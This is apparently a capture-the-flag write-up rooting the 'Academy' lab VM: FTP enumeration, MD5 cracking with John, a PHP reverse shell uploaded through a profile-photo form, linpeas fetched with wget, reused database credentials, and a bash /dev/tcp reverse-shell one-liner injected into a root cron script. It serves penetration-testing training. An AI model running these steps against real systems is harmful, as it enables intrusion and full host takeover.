# Academy

The installation process is the same as usual. Just double-click `Academy.ovf` file, this will open up Virtual Box (it might be VMWare for you). Choose the machine base folder and click OK. After that open the network settings for the machine and set it to the same NAT network as the others.

The login credentials are `root:tcm`.

First time logging in, use the  `dhclient` command followed by `ip a` to get the machine’s ip address.

## Enumeration.

Let’s run an Nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.2.6 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 05:06 EST
Nmap scan report for 10.0.2.6
Host is up (0.00042s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 3 ports open, `ftp` on port 21 which contains a `note.txt` file (interesting), `ssh` on 22 and a webserver on 80. 

NOTE: Normally during CTFs. SSH is ignored during enumeration unless valid credentials such as a username has been found. From that we can start brute forcing to find a valid password. You can try to brute force ssh by using root as a username then test to see if it has weak credentials. Another use case is to check if you can bypass detection after several brute force attempts. These are security risks that should be taken note of.

Accessing the webserver on a browser leads us to a Apache2 default page. We will try find what other pages are hiding behind the default page later.

Next let’s try checking out the ftp server using the following command, `ftp <MACHINE IP>`

We can log in anonymously by using `anonymous` as our username and leaving the password empty by pressing ENTER. List the contents using the `ls` command and download the note.txt file onto our machine using `get note.txt` . Finally we exit using the `exit` command.

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.0.2.6                                              
Connected to 10.0.2.6.
220 (vsFTPd 3.0.3)
Name (10.0.2.6:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41853|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||14645|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |***********************************************************************************************************************************************|   776      956.83 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (685.80 KiB/s)
ftp> exit
221 Goodbye.
```

Read the contents of the note file using `cat note.txt`

```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.

I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.

Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

The note contains some database information and we can use the values from it to get the login credentials. 

The `StudentRegno` corresponds to the value `10201321` and the `password` is a hashed value `cd73502828457d15655bbd7a63fb0bc8`.

We can identify the type of hash using the `hash-identifier` command (it’s MD5 btw).

Next lets try to crack the hash using `johntheripper`.  It’s a good idea to save the hash in a hash file (hash.txt or something).

We can install `johntheripper` using `apt install John`

Lets get crackin’

```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
student          (?)     
1g 0:00:00:00 DONE (2024-01-15 06:40) 100.0g/s 230400p/s 230400c/s 230400C/s amore..abcdefgh
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

We got our password, `student`.

Great. Now let’s find a page to use our credentials on. 

Let’s use a tool called `ffuf` to look for additional directories on the webserver.

Use the following command: `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u [http://<MACHINE IP>/FUZZ](http://10.0.2.5/FUZZ)`

Seems like we found an interesting directory `/academy` . Access it through the browser at `http://<MACHINE IP>/academy`

We now have access to an online registration portal. 

Time to use the credentials we obtained (`10201321:student`) to log in.

We’re in!!! From here navigate to `My Profile` . There’s an option to upload an image. But we might be able to exploit this by uploading a reverse shell instead and get a connection back.

The website uses php so we can google for php reverse shell. Our first result would probably be this [repo](https://github.com/pentestmonkey/php-reverse-shell), and for a good reason. It’s really good!! Click on `php-reverse-shell.php` and copy the contents into a text editor. 

All we need to do is change the following below to our Kali IP and a random port number:

![2024-01-15 15_53_03-Kali [Running] - Oracle VM VirtualBox.png](Academy%207200b17c6043423e9c799a1a4b9cb534/2024-01-15_15_53_03-Kali_Running_-_Oracle_VM_VirtualBox.png)

Once we’ve made the changes. Save and start a netcat listener with the port we specified in the reverse shell using the following command: `nc -nvlp 1234`.

Go back to the profile page and upload our reverse shell:

![revshell.png](Academy%207200b17c6043423e9c799a1a4b9cb534/revshell.png)

Click `Update` , go back to our netcat listener and boom! We popped yet another shell!

```bash
──(kali㉿kali)-[~]
└─$ nc -nvlp 1234    
listening on [any] 1234 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.152] 41186
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 11:15:12 up 1 min,  1 user,  load average: 0.30, 0.26, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                12:13     ?     0.00s  0.00s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ sudo -l
/bin/sh: 2: sudo: not found
$ which sudo
$ locate sudo
/bin/sh: 4: locate: not found
```

So we got a shell, as an unprivileged user (AKA not root). Next thing to do is to find a way to elevate our privileges, and here comes a handy little script called [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) which allows us to search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

Follow the instructions in the repo and download it onto the Kali machine.

Next lets start a python server in the same directory as our linpeas file in order to download it onto our vulnerable machine. We can do this using `python3 -m http.server 80`. 

Back on the vulnerable machine, use the `wget` command followed by your kali ip and the filename to download. After that give it executable permissions using `chmod +x [linpeas.sh](http://linpeas.sh)` and finally run it using `./linpeas.sh`:

```bash
$ cd /tmp
$ pwd
/tmp
$ wget http://10.0.2.4/linpeas.sh
--2024-01-17 11:37:34--  http://10.0.2.4/linpeas.sh
Connecting to 10.0.2.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847920 (828K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6% 57.2M 0s
    50K .......... .......... .......... .......... .......... 12% 60.6M 0s
   100K .......... .......... .......... .......... .......... 18% 42.3M 0s
   150K .......... .......... .......... .......... .......... 24% 61.7M 0s
   200K .......... .......... .......... .......... .......... 30% 21.2M 0s
   250K .......... .......... .......... .......... .......... 36% 45.3M 0s
   300K .......... .......... .......... .......... .......... 42% 66.9M 0s
   350K .......... .......... .......... .......... .......... 48% 51.9M 0s
   400K .......... .......... .......... .......... .......... 54% 46.5M 0s
   450K .......... .......... .......... .......... .......... 60% 69.2M 0s
   500K .......... .......... .......... .......... .......... 66% 77.1M 0s
   550K .......... .......... .......... .......... .......... 72% 37.6M 0s
   600K .......... .......... .......... .......... .......... 78% 26.9M 0s
   650K .......... .......... .......... .......... .......... 84% 58.5M 0s
   700K .......... .......... .......... .......... .......... 90% 67.5M 0s
   750K .......... .......... .......... .......... .......... 96% 70.0M 0s
   800K .......... .......... ........                        100% 40.3M=0.02s

2024-01-17 11:37:34 (47.3 MB/s) - 'linpeas.sh' saved [847920/847920]

$ ls
linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

After a while, Linpeas will provide us with a lot of information. Feel free to go through it. But the most important things we can get out of the results are;

![backup.sh.png](Academy%207200b17c6043423e9c799a1a4b9cb534/backup.sh.png)

Interesting…a `[backup.sh](http://backup.sh)` file is a win most of the time.

And…

![secure pass sql.png](Academy%207200b17c6043423e9c799a1a4b9cb534/secure_pass_sql.png)

A password to a mysql database. We can copy the path and use the `cat` command to check for more info.

```bash
$ cat /var/www/html/academy/includes/config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
```

 It looks like we have a user `grimmie` with the password `My_V3ryS3cur3_P4ss` . 

It’s a good idea to try a ssh login with these credentials.

```bash
──(kali㉿kali)-[~]
└─$ ssh grimmie@10.0.2.152                                                                                           
The authenticity of host '10.0.2.152 (10.0.2.152)' can't be established.
ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.152' (ED25519) to the list of known hosts.
grimmie@10.0.2.152's password: 
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
```

Nice. It worked. Now let’s try and move to the directory of the `[backup.sh](http://backup.sh)` file from the Linpeas results.

```bash
grimmie@academy:~$ cd /home/grimmie
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
grimmie@academy:~$ crontab -l
no crontab for grimmie
grimmie@academy:~$ crontab -u root -l
must be privileged to use -u
grimmie@academy:~$ systemctl list-timers
NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
Wed 2024-01-17 13:26:02 EST  9min left  n/a                          n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2024-01-17 13:39:00 EST  22min left Wed 2024-01-17 13:11:44 EST  4min 37s ago phpsessionclean.timer        phpsessionclean.service
Thu 2024-01-18 00:00:00 EST  10h left   Wed 2024-01-17 12:00:26 EST  1h 15min ago logrotate.timer              logrotate.service
Thu 2024-01-18 00:00:00 EST  10h left   Wed 2024-01-17 12:00:26 EST  1h 15min ago man-db.timer                 man-db.service
Thu 2024-01-18 05:22:43 EST  16h left   Wed 2024-01-17 12:00:26 EST  1h 15min ago apt-daily.timer              apt-daily.service
Thu 2024-01-18 06:59:51 EST  17h left   Wed 2024-01-17 12:00:26 EST  1h 15min ago apt-daily-upgrade.timer      apt-daily-upgrade.service

6 timers listed.
Pass --all to see loaded but inactive timers, too.
grimmie@academy:~$ ps
  PID TTY          TIME CMD
  696 pts/0    00:00:00 bash
  754 pts/0    00:00:00 ps
```

Seems like the [backup.sh](http://backup.sh) is set to  a zip file `/tmp/backup.zip` from the directory `/var/html/academy/includes` and then changes the file’s permission.

This backup script is set to execute at set intervals (minutes, hours, days) but we don’t know. We can try a variety of methods to get this information such as using the `crontab` command to see what cronjobs are running. A cronjob is a Linux command used for scheduling tasks to be executed in the future. Some of these tasks run with root permissions and can be used to escalate privileges. Sadly we don’t have those here.

The `systemctl list-timers` is used to view scripts that are running on a timer. And the `ps` command lists all the processes currently running. As well as information about them.

In a situation like this, we can use a tool called [pspy](https://github.com/DominicBreuker/pspy) that allows us to retrieve even more information on running processes. Head over to the repo and download the 64 bit big, static version. 

Next, move the file over to the grimmie user exactly the same way as we did with linpeas.

```bash
grimmie@academy:/tmp$ wget http://10.0.2.4/pspy64
--2024-01-17 13:47:59--  http://10.0.2.4/pspy64
Connecting to 10.0.2.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                         100%[====================================================================================================>]   2.96M  --.-KB/s    in 0.01s   

2024-01-17 13:47:59 (276 MB/s) - ‘pspy64’ saved [3104768/3104768]

grimmie@academy:/tmp$ ls
pspy64  systemd-private-1beb94f972f4459898e88d099e38143c-apache2.service-YSvT2y  systemd-private-1beb94f972f4459898e88d099e38143c-systemd-timesyncd.service-mzvFql
grimmie@academy:/tmp$ chmod +x pspy64
grimmie@academy:/tmp$ ./pspy64
```

Wait for it to run till we see some information on `backup.sh`

![grimmie process.png](Academy%207200b17c6043423e9c799a1a4b9cb534/grimmie_process.png)

Looks like the `[backup.sh](http://backup.sh)` seems to be executing at one minute intervals.

Lets try to exploit this.

Google `bash reverse shell one liner`. First result should be this site: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Copy this line: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

If we put this line into the `[backup.sh](http://backup.sh)` file. The next time it executes, we will get a reverse shell as root!!

NOTE: Make sure to change the `10.0.0.1` in the one liner to our Kali IP. We can leave the port `8080` as is.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
```

```bash
grimmie@academy:~$ cd /home/grimmie
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ nano backup.sh
```

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.0.2.4/8080 0>
```

`CTRL + O` to save then `CTRL + X` to exit

Go back to the netcat listener..

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.152] 38358
bash: cannot set terminal process group (672): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~# whoami
whoami
root
root@academy:~# cd /root
cd /root
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
```

😎